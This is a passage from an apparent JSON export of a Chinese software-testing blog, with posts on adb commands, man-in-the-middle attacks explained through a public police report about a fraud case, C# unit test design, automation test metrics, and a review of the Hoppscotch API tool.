android.intent.action.VIEW -d \u0026#34;\u0026lt;some_url\u0026gt;\u0026#34; 比如下面的例子\n1 adb shell am start -a android.intent.action.VIEW -d \u0026#34;https://developer.android.com/docs\u0026#34; 输入文字 在文本框中输入并focus文本\n1 adb shell input text \u0026#34;\u0026lt;some_input\u0026gt;\u0026#34; 一些特殊字符!, \u0026amp;, (,是需要用反斜杠(\\)转义的\n1 adb shell input text \u0026#34;\\!\\\u0026amp;\\(\\)\\\u0026lt;\\\u0026gt;\\*\\|\u0026#34; 点击Home按钮 KEYCODE_HOME事件可以用来模拟点击Home按钮的效果\n1 adb shell input keyevent KEYCODE_HOME 干掉应用 可以通过模拟按钮的方式来终止应用\n1 2 3 adb shell input keyevent KEYCODE_APP_SWITCH adb shell input keyevent KEYCODE_DPAD_DOWN adb shell input keyevent DEL 清除应用数据 1 adb shell pm clear \u0026lt;package_name\u0026gt; 在这个例子里Google Chrome 浏览器打开了 4 个tab。当应用数据被清除并再次启动Activity时，显示Terms of Service页面（首次启动时显示的页面）并表明应用缓存和数据被清除。\n屏幕截图 截图并拉回本地\n1 2 adb shell screencap /sdcard/\u0026lt;screenshot_name\u0026gt;.png adb pull /sdcard/\u0026lt;screenshot_name\u0026gt;.png 录屏 1 adb shell screenrecord /sdcard/\u0026lt;some_video_name\u0026gt;.mp4 注意: 命令执行之后，需要按下ctrl+c来停止录屏\n最后把视频拉回到本地\n1 adb pull /sdcard/\u0026lt;some_video_name\u0026gt;.mp4 查看应用程序日志 1 adb logcat 访问应用程序的data目录 这时候需要用到adb shell\n1 2 adb shell run-as \u0026lt;package_name\u0026gt; 卸载应用 1 adb uninstall \u0026lt;package_name\u0026gt; https://lavanyamohan.hashnode.dev/common-adb-commands-i-use-while-testing?utm_campaign=Software%2BTesting%2BWeekly\u0026amp;utm_medium=email\u0026amp;utm_source=Software_Testing_Weekly_114\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%B8%B8%E7%94%A8%E7%9A%84adb%E5%91%BD%E4%BB%A4/","title":"常用的adb命令"},{"content":"一般情况下我是不喜欢追热点蹭热度的，不过这两天公安机关警情通报之后，吴亦凡事件发生了各种逆转，这起全员恶人事件非常凑巧的契合了安全测试中的一个概念：也就是中间人攻击。我们在吃瓜之余可以简单了解一下中间人攻击的一些原理，通过例子去学习，印象自然会深刻一些。\n什么是中间人攻击？ 下面的定义来自维基百科。\n中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）在密码学和计算机安全领域中是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。\n一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。\n举个例子 下面的内容依然来自维基百科。\n假设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。\n首先，爱丽丝会向鲍伯索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。\n爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。\n具体展开如下：\n1.爱丽丝发送给鲍伯一条消息，却被马洛里截获：\n爱丽丝“嗨，鲍伯，我是爱丽丝。给我你的公钥” \u0026ndash;\u0026gt; 马洛里 鲍伯\n2.马洛里将这条截获的消息转送给鲍伯；此时鲍伯并无法分辨这条消息是否从真的爱丽丝那里发来的：\n爱丽丝 马洛里“嗨，鲍伯，我是爱丽丝。给我你的公钥” \u0026ndash;\u0026gt; 鲍伯\n3.鲍伯回应爱丽丝的消息，并附上了他的公钥：\n爱丽丝 马洛里\u0026lt;\u0026ndash; [鲍伯的公钥]\u0026ndash; 鲍伯\n4.马洛里用自己的密钥替换了消息中鲍伯的密钥，并将消息转发给爱丽丝，声称这是鲍伯的公钥：\n爱丽丝\u0026lt;\u0026ndash; [马洛里的公钥]\u0026ndash; 马洛里 鲍伯\n5.爱丽丝用她以为是鲍伯的公钥加密了她的消息，以为只有鲍伯才能读到它：\n爱丽丝“我们在公共汽车站见面！”\u0026ndash;[使用马洛里的公钥加密] \u0026ndash;\u0026gt; 马洛里 鲍伯\n6.然而，由于这个消息实际上是用马洛里的密钥加密的，所以马洛里可以解密它，阅读它，并在愿意的时候修改它。他使用鲍伯的密钥重新加密，并将重新加密后的消息转发给鲍伯：\n爱丽丝 马洛里“在家等我！”\u0026ndash;[使用鲍伯的公钥加密] \u0026ndash;\u0026gt; 鲍伯\n7.鲍伯认为，这条消息是经由安全的传输通道从爱丽丝那里传来的。\n这个例子显示了爱丽丝和鲍伯需要某种方法来确定他们是真正拿到了属于对方的公钥，而不是拿到来自攻击者的公钥。否则，这类攻击一般都是可行的，在原理上，可以针对任何使用公钥——密钥技术的通讯消息发起攻击。\n边吃瓜边学习 首先我们看一下公安机关的调查结果，代入上面的中间人攻击原理，简单还原一下这次光怪陆离的事件。\n据北京朝阳警方通报： 近日，针对都某竹通过网络反映受到侵害和吴某凡一方报警称被敲诈勒索的情况，公安机关介入调查后，通过讯问嫌疑人、询问当事人、走访证人、调取书证、固定提取电子证据等工作，初步查明了有关事实。现就调查情况通报如下： 一、关于吴某凡与都某竹交往情况 2020年12月5日22时许，冯某（女，28岁，时任吴某凡执行经纪人）以挑选MV女主角面试为由，约都某竹（女，18岁）到吴某凡（男，30岁）家中参加聚会，10余人共同玩桌游并饮酒，次日凌晨至7时许，其他聚会人员陆续离开，都某竹酒后在吴某凡家中留宿，两人发生性关系。当日下午，都某竹在吴某凡家中用餐后自行离开，期间两人互相添加微信。12月8日，吴某凡给都某竹转账3.2万元用于网络购物。此后至2021年4月期间，两人保持微信联系。 二、关于都某竹等人发布网络信息情况 2021年6月，都某竹与好友刘某文（女，19岁）商议，在网上公开与吴某凡交往过程以提升网络知名度，遂由刘某文于6月2日以“刘美丽同学_”微博账号发布都某竹被吴某凡“冷暴力”的博文，7月8日至7月11日，都某竹跟进发布3篇博文。7月13日，网络写手徐某（男，31岁）为牟取利益，主动联系都某竹，经商议后，共同策划并由徐某撰写“决战”等10余篇微博文案，7月16日起由都某竹通过微博账号陆续发布。 三、关于犯罪嫌疑人刘某迢涉嫌诈骗犯罪的情况 2021年7月14日，朝阳警方接到吴某凡母亲吴某报警，称遭到都某竹敲诈勒索。当日警方依法进行了受理和调查，工作中锁定犯罪嫌疑人刘某迢（男，23岁），并于2021年7月18日在江苏省南通市将该人抓获。 经查，2021年6月，犯罪嫌疑人刘某迢看到都某竹和吴某凡的网络炒作信息后，遂产生冒充相关关系人对涉事双方进行诈骗的想法。期间，刘某迢虚构女性身份，以曾被吴某凡欺骗感情欲共同维权的名义骗取都某竹的信任，使用昵称为“DDX”微信号与都某竹联系，获取都某竹与吴某凡部分交往情况信息。7月10日，刘某迢利用获取的信息冒用都某竹名义与吴某凡律师联系，以双方达成和解为名索要300万元赔偿，并将自己和都某竹的银行账户一并发给吴某凡律师。同时，刘某迢使用“北京凡世文化传媒”微信号，自称系吴某凡律师，与都某竹协商达成300万元的和解赔偿，但双方未签署和解协议。 7月11日，吴某凡母亲分两次向都某竹账户转账50万元。此后，未得到钱款的刘某迢继续冒充都某竹，向吴某凡律师索要剩余250万元未遂。后又冒充吴某凡律师要求都某竹签署和解协议，否则索回50万元。都某竹同意退款后，刘某迢冒充吴某凡律师将本人的支付宝账号提供给都某竹，都某竹陆续向该账号转账18万元。 刘某迢被抓获后，对其诈骗犯罪事实供认不讳。目前，该人已被朝阳公安分局依法刑事拘留。 针对网民举报的“吴某凡多次诱骗年轻女性发生性关系”及近期网络互曝的有关行为，警方仍在调查中，将根据调查结果依法处理。\n这里涉及到3个人物，分别是吴，都，以及中间人刘\n1，刘某迢虚构女性身份，以曾被吴某凡欺骗感情欲共同维权的名义骗取都某竹的信任，使用昵称为“DDX”微信号与都某竹联系，获取都某竹与吴某凡部分交往情况信息。这部分信息其实只有吴和都知道，所以可以认为是吴和都进行身份认证的公钥，只要出示这个公钥，吴和都就可以确信对方的身份，毕竟一些事情只有天知地知你知我知；\n2，7月10日，刘某迢利用获取的信息冒用都某竹名义与吴某凡律师联系，以双方达成和解为名索要300万元赔偿，并将自己和都某竹的银行账户一并发给吴某凡律师。这一步中间人直接伪造消息发送给吴，并通过公钥获取了吴的信任，将自己认证为都；\n3，同时，刘某迢使用“北京凡世文化传媒”微信号，自称系吴某凡律师，与都某竹协商达成300万元的和解赔偿，但双方未签署和解协议。这一步，中间人又故技重施，伪造吴的消息发送给都。\n由于第1步刘已拿到了双方的公钥，所以已经具备了中间人攻击的条件。一般情况下中间人都是一个监听者，被监听双方互相通信时，中间人会收到消息，查看甚至篡改消息的内容，比如你用了一个wifi，通过http（非https）请求将密码发送给了对端，那么中间人可能会截取你的密码，造成信息的泄漏。不过这个事件里的刘很显然是一个勤奋的中间人，吴和都其实并没有主动发起通信，所有的消息都是中间人伪造，完全凭借自己的努力让两方鸡犬不宁，矛盾无法调和，从而将这场闹剧推向了高潮；\n4，7月11日，吴某凡母亲分两次向都某竹账户转账50万元。这里吴向都发送的消息直接被中间人截获，中间人没有向都转发，从而为日后的东窗事发埋下伏笔。有人说这一步其实吴母动了吴秀波的心思，这里见仁见智，大家应该有自己的判断；\n5， 此后，未得到钱款的刘某迢继续冒充都某竹，向吴某凡律师索要剩余250万元未遂。中间人伪造信息发送给吴，都是不知情的；\n6，后又冒充吴某凡律师要求都某竹签署和解协议，否则索回50万元。都某竹同意退款后，刘某迢冒充吴某凡律师将本人的支付宝账号提供给都某竹，都某竹陆续向该账号转账18万元。伪造吴的消息发送给都，吴不知情，都也应该很懵，毕竟凭空账户多了50万，前车之鉴还历历在目，这里警惕性应该是上来了的；\n7，刘某迢被抓获后，对其诈骗犯罪事实供认不讳。目前，该人已被朝阳公安分局依法刑事拘留。\n多行不义必自毙，刘的中间人攻击暴露是迟早的事情，毕竟中间人攻击的核心是隐藏在暗处，监听和篡改双方的信息从而达到获利的目的。这次的事件里，通信双方其实是没有主动联系过的，所有的魔幻情节全靠中间人一己之力全力推动，导致双方起疑，进而报警事发。这就好比中介卖房，本来买卖双方并没有强烈的意愿，结果中介强行撮合，给双方一些虚假信息，这样很容易引起买卖双方的反感，从而让交易泡汤。\n如何防御中间人攻击 以下来自维基百科\n许多抵御中间人攻击的技术基于以下认证技术：\n公钥基础建设 在PKI方案中，主要防御中间人攻击的方案就是PKI的相互认证的机制。使用这样的机制并由应用程序验证用户，用户设备验证应用程序。但在某些流氓应用的情况下，这不是很有用，所以需要注意对流氓软件应与正规软件进行区分。 更强力的相互认证，例如： 密钥（通常是高信息熵的密钥，从而更安全），或 密码（通常是低的信息熵的密钥，从而降低安全性） 延迟测试，例如使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。 第二（安全的）通道的校验 一次性密码本可以对中间人攻击免疫，这是在对一次密码本的安全性和信任上创建的。公钥体系的完整性通常必须以某种方式得到保障，但不需要进行保密。密码和共享密钥有额外的保密需求。公钥可以由证书颁发机构验证，这些公钥通过安全的渠道（例如，随Web浏览器或操作系统安装）分发。公共密钥也可以经由Web在线信任进行在线验证，可以通过安全的途径分发公钥（例如，通过面对面的途径分发公钥） ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%BB%8E%E5%90%B4%E4%BA%A6%E5%87%A1%E4%BA%8B%E4%BB%B6%E5%AD%A6%E4%B9%A0%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/","title":"从吴亦凡事件学习安全测试"},{"content":"最近因为面试的关系跟一些大厂的测试经理有过一些交流，我们不妨看看大厂的测试经理们都在做什么吧。\nA来自某一线互联网大厂，担任测试经理应该十多年了，有着丰富的质量管理经验。在聊的过程中我发现A近两年的工作重心都放在效能提升方面。因为机会难得，我就问了一些我比较关注的问题。\n问：如何提升测试开发比，比如从1比3提升到1比4？\n答：我们之前的测试开发比其实也很高，不过现在已经降到1比7或者1比8了。这里面有一些事情是可以做的。首先质量管理方面产品的出厂质量不能降低，质量保障是一个端到端的事情，不能只靠测试同学去保障，研发人员也是质量控制中很重要的一环，所以研发人员在质量上游也要做好测试，这样后面的质量压力就会轻一点。另外我们还会定义标准的出厂测试以及uat测试的流程和指标，哪些东西要测以及怎么测，哪些指标要达到多少，什么环境进行什么样的测试，我们都会定义的很精细，这样才能花比较确定的力气去做一些相对确定的事情。另外需要尽可能的去自动化，或者开发相关的工具平台，给测试提效；最后还要管理好老板的预期，因为尽管有提升的空间，但整个过程还是需要花时间的。\n问：自动化测试的维护成本很高，比如系统的频繁改动会导致用例的更新速度跟不上，针对这一点有什么好的办法呢？\n答：接口测试没有界面相对来说维护成本还好，但是带ui的自动化测试维护成本确实很高，但一些项目又不能没有ui的自动化测试用例，对于这种情况，我们只能说用外包来尽量补，技术债总是有的，测试也有技术债，需要花成本去还。\n在跟A的聊天过程中，我发现大厂的质量管理现在做的越来越精细化和标准化，一些质量度量指标也更加立体和实际，聊完之后非常有收获。\n相对于A一直在一线大厂，B的经历要丰富一些。两年多之前在某一线厂负责核心系统的整体测试，目前在二线大厂负责整体的测试工作，下属规模还是比较大的。\n问：可以简单了解一下在公司的主要工作职能吗？\n答：做的事情可以分为两大块。第一块是规范质量流程，定义质量度量的指标，比如怎么样才算是质量好，这里可以做的事情非常多，比如规范测试流程方面，我们定义了具体的质量保障流程以及流程中的交付物和产出物，质量的管理变得更加的高效和精益。第二块就是测试效率的提升和整体研发效能提升，里面也有很多细节。\n问：可以方便了解一下在度量质量方面，我们定义了哪些指标呢？\n答：主要的指标就是线上故障数。线上故障数来自几个方面。首先是用户的反馈。用户反馈分三个方面。第一个是吐槽；第二个是产品建议；第三个就是线上故障了。我们通过一些渠道收集这些用户反馈并进行记录；然后是发布时出现的故障，看回滚数就可以了；第三是我们一些钉钉群里的反馈，比如老板的反馈和内部反馈等；最后就是测试和开发在日常使用过程中发现的线上故障数和用户app端上报时发现的故障数。\n问：所以线上故障数就是线上bug对吧？\n答：不太一样，线上bug是汇总过的，比如一个线上bug可能会引发几百个故障，如果只记录1个线上问题的话，那么就没办法比较好的比较bug的严重程度的。所以记录故障，对故障的影响范围的评估就相对容易一些，就不会出现线上问题的影响范围变小的问题了，因此对线上的质量就有比较客观的评估了。\n问：那在效能提升方面，我们做了哪些实践呢？\n答：主要几个方面吧。首先定义了标准的开发过程，比如之前我们抽查过一些项目，从需求提出到上线可能要30多天(这里记得不是很清楚了)，后来我们通过定义好开发的标准过程，主要是消除状态扭转时的耗时，我们发现需求上线周期可能只要7天了。其实研发的效率并没有得到提升，开发一个需求还是需要3-4天，但是由于过程定义清楚了，大家的职责范围更明确了，就不能甩锅了，因此研发整体效率提升了不少；另一个实践就是专项测试。我记得当时我来的时候某个功能开发要3天，测试却要21天，这实在是吓到我了，后来我们进行了测试专项的优化，这个时间只需要2天了，而且发现的bug数还有了较大的提升，这是一个很典型的例子 。最后就是工具的研发，提升开发的debug效率以及测试的效率。\n这两位候选人都是谈吐得体，胸有成竹，思维缜密，经验丰富。尽管目前不参与一线研发工作了，但是两位的技术基础都是过硬的，看一下他们的履历，都是国内一流大学毕业，工作经历都以大厂为主。A基本上是大厂质量管理体系的职位的天花板般的存在；B则是二线大厂的整体质量负责人，也是二线大厂的天花板了。我何德何能竟然以面试官的角色跟二位进行交流，说来确实是惭愧的很。\n总来的来说这些高端职位的面试我尽管没有诚惶诚恐，但确实看到了跟一流人才的巨大差距。保持谦逊，向头部人才学习，继续上下求索吧，自勉。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%A4%A7%E5%8E%82%E7%9A%84%E6%B5%8B%E8%AF%95%E7%BB%8F%E7%90%86%E4%BB%AC%E9%83%BD%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88%E5%91%A2/","title":"大厂的测试经理们都在干什么呢"},{"content":"最近一些大公司在进行去测试化的操作，这一切的根源大概可以从几年前微软一刀切砍掉所有内部正式的测试人员开始说起，当时微软内部的测试工程师有一部分转职成了开发工程师，他们的职能中有很大一部分的职责是教会普通开发人员如何进行测试。我们都知道开发人员进行的测试一般以单元测试为主，假如有一天你所在的组织需要你转变成一名测试方面的教练，除了自动化测试之外还需要去推广单元测试，那么你该如何去定义单元测试用例的设计方法论呢？这里给大家一些思路，看看简单的单元测试用例究竟该如何设计。\n一个方法可以有任意数量的有效测试用例；它最终取决于方法的结构。有两种简单的方式可以帮助我们设计单元测试用例。\n参数方法 执行路径方法 我将通过提供真实的代码来进行演示。所有代码片段都将用 C# 编写，断言将使用我最喜欢的单元测试包 Fluent Assertions。\n我们将为以下方法提供测试用例：\n1 2 3 4 public static bool ContainsNamelessItems(this List\u0026lt;Item\u0026gt; items) { return items.Any(item =\u0026gt; item.Name.IsNullOrEmpty()) } 此方法将项目集合作为参数。它遍历项目列表，并针对每个项目Item检查其name属性是否为空。如果name存在且不为空，我们返回True，否则我们返回False。\n使用参数方法创建测试用例 这种方式主要考虑的是入参可以传递哪些值。\n查看该方法的参数ContainsNamelessItems，我们有一个List名为items. 此参数可能有几个可能的值：\nitems 是空的 items至少包含 1 个Item具有Name未定义的属性 items不包含具有未定义Name属性的项目 items 是 null 这些可能的值中的每一个都可以作为单独的用例存在。\n以下是一些可能的测试用例和断言：\n1，当List\u0026lt;Item\u0026gt;为空时，我们期望返回值是False因为其的List\u0026lt;Item\u0026gt;无name属性。\n1 2 3 4 5 6 7 8 9 public void WhenItemsIsEmpty_ReturnFalse() { var items = new List\u0026lt;Item\u0026gt;(); var result = items.ContainsNamelessItems(); result.Should() .BeFalse(\u0026#34;because an empty collection cannot contain nameless items\u0026#34;); } 2，当List\u0026lt;Item\u0026gt;包含至少 1 项没有name属性的Item时，我们期望返回值是True\n1 2 3 4 5 6 7 8 9 10 11 12 13 public void WhenItemsContainsANamelessItem_ReturnTrue() { var items = new List\u0026lt;Item\u0026gt; { { new Item { Name = \u0026#34;Item1\u0026#34; }, { new Item { Name = string.Empty } // nameless item }; var result = items.ContainsNamelessItems(); result.Should() .BeTrue(\u0026#34;because there is a nameless item in the collection\u0026#34;); } 3，当List\u0026lt;Item\u0026gt;不包含任何没有name属性的项目时，我们期望返回值是False，因为所有项目都有name。\n1 2 3 4 5 6 7 8 9 10 11 12 13 public void WhenItemsDoesNotContainANamelessItem_ReturnFalse() { var items = new List\u0026lt;Item\u0026gt; { { new Item { Name = \u0026#34;Item1\u0026#34; }, { new Item { Name = \u0026#34;Item2\u0026#34; } }; var result = items.ContainsNamelessItems(); result.Should() .BeFalse(\u0026#34;because there are no nameless items in the collection\u0026#34;); } 4，当List\u0026lt;Item\u0026gt;is null的时候，我们期望抛出ArgumentNullException异常，这往往是最难想到的。\n1 2 3 4 5 6 7 8 9 public void WhenItemsIsNull_ThrowArgumentException() { List\u0026lt;Item\u0026gt; items = null; Action act = () =\u0026gt; items.ContainsNamelessItems(); act.Should() .Throw\u0026lt;ArgumentNullException\u0026gt;(\u0026#34;because the collection is null\u0026#34;); } 使用执行路径方法创建测试用例 路径方式需要遍历被测方法并找到所有不同的执行路径。\n我们上面定义的方法只有一条执行路径，因为除了直接到达方法的末尾之外，没有任何条件驱动路径。要改变路径，我们就需要引入某种条件，可以通过if\u0026hellip;else、 switch以及try/catch语句。在这些条件块中，方法可能会在达到某个条件的情况下直接退出，而不是运行到方法的最后一行。\n下面我们就引入条件。假设我们不希望方法在入参为空时候抛出ArgumentNullException异常，而是想抛出一个我们自定义的ArgumentException异常。那么我们必须向检查项目列表是否为空的方法添加一个条件。\n流程图如下：\n现在，如果项目为空，则有可能提前退出，而不是走到方法的末尾，具体实现如下\n1 2 3 4 5 6 7 public static bool ContainsNamelessItems(List\u0026lt;Item\u0026gt; items) { if (items == null) throw new ArgumentException(\u0026#34;The collection of items should not be null.\u0026#34;); return items.Any(item =\u0026gt; item.Name.IsNullOrEmpty()) } 这个测试用例的相应测试看起来像这样：\n1 2 3 4 5 6 7 8 9 public void WhenItemCollectionIsNull_ThrowArgumentException() { List\u0026lt;Item\u0026gt; items = null; Action act = () =\u0026gt; items.ContainsNamelessItems(); act.Should().Throw\u0026lt;ArgumentException\u0026gt;() .WithMessage(\u0026#34;The collection of items should not be null.\u0026#34;); } 总结 在入参的时候可以用等价类的方式构造任意参数，强类型语言里无效类用的会相对少一些，毕竟编译器会进行校验；而弱类型语言里无效类比较隐蔽，是测试的重点； 执行路径方法其实就是分支覆盖，通过不通的输入参数去覆盖所有分支，比如同样是有效类的输入情况下，空集合和非空集合可能会走到不通的路径； 在方法或函数特别复杂的情况下，可以试着去把方法拆小，从而获得更好的可测试性； ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1/","title":"单元测试用例该如何设计"},{"content":"低代码自动化测试平台的普及，测试同学代码能力的提升使得目前自动化测试已经成了测试工作中非常重要的组成部分，不管是由于kpi压力也好，还是因为需要消除其他方面的质疑声音也罢，我们经常需要在工作中制定一些可以度量的指标来描述某项工作或者改进的实际效果。那么有哪些指标可以去度量自动化测试的最终效果呢，这里给大家一些常见指标作为参考。\n可自动化率 这个指标主要是描述所有的测试用例中有多少的用例可以被用自动化的方式进行回归，毕竟有一些用例可能还是要手动去执行的，这个值越高那么进行自动化的边际成本可能就越低。\n计算公式：可自动化率 = （可以实现自动化的用例数量 / 用例总数）* 100\n自动化脚本bug发现率 这个指标可以直观的描述自动化测试的效果，你可以通过这个指标来评估当前的投入产出比是否可以接受，另外在不同的测试环境中的效果应该是不一样的，举例来说在测试环境中我们可能主要是进行新功能的测试，那么发现的大多数问题可以都是来自手工测试，但是在staging环境或者说是预发布环境，我们应该主要通过自动化脚本来发现bug，所以这个效果值应该相对高一些。\n计算公式：（自动化测试发现的bug数 / 有效bug数）* 100\n用例通过率 这个指标用来衡量用例的稳定性和自动化测试的实际效率，毕竟如果通过率低的话就意味着我们需要花费大量的时间去定位运行失败的原因。在多次测试中，通过率如果明显下降那么可能意味着：要么是我们的用例不稳定，不值得信赖；要么是本次的发布中包含了太多的bug。\n计算公式：（通过的用例数 / 执行的用例数）* 100\n用例执行时间 天下武功，唯快不破。如果用例执行的速度太慢那么我们就没有办法在代码部署后迅速的给开发人员以反馈，浪费时间就是浪费生命。\n计算公式：用例结束时间 - 用例开始时间\n自动化测试用例覆盖率 耳熟能详的概念，也是很多团队都会追求的一个指标，覆盖率越高就证明测试回归的效率越高，这是一个需要长期追踪的指标，kpi里寻常见，okr前几度闻。\n计算公式：（自动化用例数 / 用例总数）* 100\n自动化用例异常率 顾名思义的指标，值得去长期关注的指标，其实就是通过率的另一种体现，失败率高可能意味着系统或产品的行为发生了更新，用例也需要进行相应的修改了。\n计算公式：每次用例执行（失败用例数 / 执行的用例数）* 100\n构建异常率 用例追踪cicd中构建质量的指标，异常率越高可能就意味着代码质量相对较差。\n计算公式：（构建失败次数 / 构建总数）* 100\n迭代中的自动化测试创建率 理论上说我们这个迭代开发的功能就应该在该迭代中被自动化用例所覆盖，迭代完成之后补作业的行为是不推荐的。这个指标可以告诉我们我们离该目标还有多少距离。\n计算公式：（本迭代中创建的用例数 / 非本迭代中创建的用例数）* 100\n自动化进度 我们的目标是将所有可以自动化的用例都进行自动化，这个指标告诉我们距离这个小目标实现有还有多少路要走。\n计算公式：（当前自动化用例总数 / 可以被自动化的用例数）* 100\n测试金字塔 这个指标可以告诉我们当前自动化用例的分布情况，理想情况下测试用例的分布应该是金字塔型的，ui用例最少，接口和集成用例较多，单元测试用例最多。\n计算公式：（每种自动化测试用例的数量 / 用例总数）* 100\n总结 年底了，希望这些指标可以帮助大家进行下一年度的kpi或okr规划。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%BA%A6%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C%E7%9A%8410%E4%B8%AA%E6%8C%87%E6%A0%87/","title":"度量自动化测试效果的10个指标"},{"content":"天下苦postman久矣！\n记得当初potman刚横空出世时，其形态只是一个浏览器扩展而已，尽管功能简单，不过却带来了另一个非常大的优势，那就是软件体积非常小，安装到浏览器上以后可以借助于浏览器同步的功能，实现各种跨平台支持，特别是对我我这种拥有win/mac/iinux的人来说，方便快捷是第一位的。\n后来postman推出了独立的桌面版本，功能逐渐迭代，性能差的慢慢变态，现在劝退我的是两点：启动速度慢和我用不到的功能慢慢变多；当然除了这两点外还有个相当大的槽点是：postman会想方设法让你登录，如果你不小心使用了同步功能的话，你的测试文件会公开分享到postman上供人品评，这是一个巨大的安全隐患。\nD轮融了2.25亿美金，postman注定要在商业化的道路上越走越远，注定会增加很多我不需要的功能，各种同步，花式协作，满屏的效率提升，不厌其烦的提示我升级等等，对我来说其实需求很简单，只要可以让我朴素的调试接口就可以了。\n于是各种postman的替代工具应运而生，比如postwoman，insomnia等等，这种工具的技术栈都差不多，都是用js开发的类似于原生客户端的跨平台工具，今天给大家带来的是一款很火的开源postman替代工具: hoppscotch，这个工具在github上目前有40,000的star，3月份新增4000的star，应该是目前最火的测试工具了。\n安装 hoppscotch只需要安装一个浏览器扩展就可以了，支持chrome和firefox。比postman动则上百兆的安装包来说，安装过程简单了不少。\n安装好扩展之后访问https://hoppscotch.io/就可以使用了。\nUI hoppscotch的界面跟postman差不多，会用postman的同学应该会感到比较亲切。\n功能 功能上hoppscotch也跟postman不相上下\n支持rest api调试 支持GraphQL语法 支持websocket和socket.io 支持从collection生成文档，这个我不会用 支持collection的创建及导出 支持多种Authorization方式 支持pre-request script 支持断言，跟postman的写法不能说很像，只能说是一摸一样 完善的快捷键支持 支持pwa，轻量化的网页解决方案，让网页应用的体验跟desktop一样，再也不用忍受postman的龟速启动了 支持proxy，支持自建proxy 个性化定制：白天模式和暗夜模式，各种颜色主题，可以调整字体大小 支持cli，这个真是没想到，看了一眼是go写的，功能有限，不过可以在命令行运行collection了，不过似乎不支持websocket 完全开源，前端应该是vue写的，有开发能力的同学可以进行定制 部署 我们可以在远程服务器上部署个hoppscotch版本，然后远程进行访问。不过用docker部署的话似乎有点问题，就是浏览器插件无法识别的问题，于是就需要部署个proxy用来转发请求，这样就会出现本地localhost无法解析的问题，所以如果不是必须的话，用pwa的版本体验上就已经很好了。\n总结 总的来说hoppscotch是可以替代postman的，这里推荐大家去试一试。另外hoppscotch也可以登录上传workspace，我也试过也不想试，还是那句话，能不登录就不登录，如果遇到需要协作进行collecton的场景，可以试着用git去管理。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%94%BE%E5%BC%83postman%E4%B8%80%E4%B8%AA%E6%9C%884k-star%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7hoppscotch%E8%AF%84%E6%B5%8B/","title":"放弃postman？一个月4k star？接口测试工具hoppscotch评测"},{"content":"近些年可以看出测试开发工程师是热度比较高的测试职位，除了涵盖了之前自动化测试工程师的职能外，测开同学的开发能力进一步提升，可以做到开发一些测试平台和测试框架的工作，并在推广自动化测试方面也有一定的kpi要求，能力越大责任越大，正好看到了国外有同行写的给自动化测试工程师的几条建议，觉得还是有一定道理的，所以在这里简单的分享一下，希望对大家所有裨益。\n质量心态 作为测试开发工程师，我们可能专注于学习测试工具和测试框架，提升代码能力，日复一日，循环往复。学习是没问题的，不管你是测试开发还是功能测试同学，持续学习应该是整个职业生涯里必不可少的一部分。话虽如此，不过对于测试同学来说，全方位的质量心态还是很有必要的。\n那么质量心态是什么呢？作为测试开发同学，我们应该关注项目/产品质量的方方面面，而不是仅仅满足于将验收标准或者是手工用例转化成自动化脚本。\n相反，我们应该站在质量控制的层面去从用户的角度带入思考，如果我们的脚本不能为用户带来价值，那么这些脚本其实就没有价值。\n举一个例子，我们在提交一个表单的时候，比如注册用户以后，我们的ui自动化用例是不是需要去查数据库，看看新的用户记录已经被持久化到了用户表里？我的答案是：在开发时间有限的前提下不需要去连数据库查询，因为用户是不会连数据库直接看数据的，我们应该从用户可以感知到的方面进行断言。连数据库查询的事情可以交给其他类型的自动化用例，比如单元测试用例去实现。\n获取其他测试领域的知识 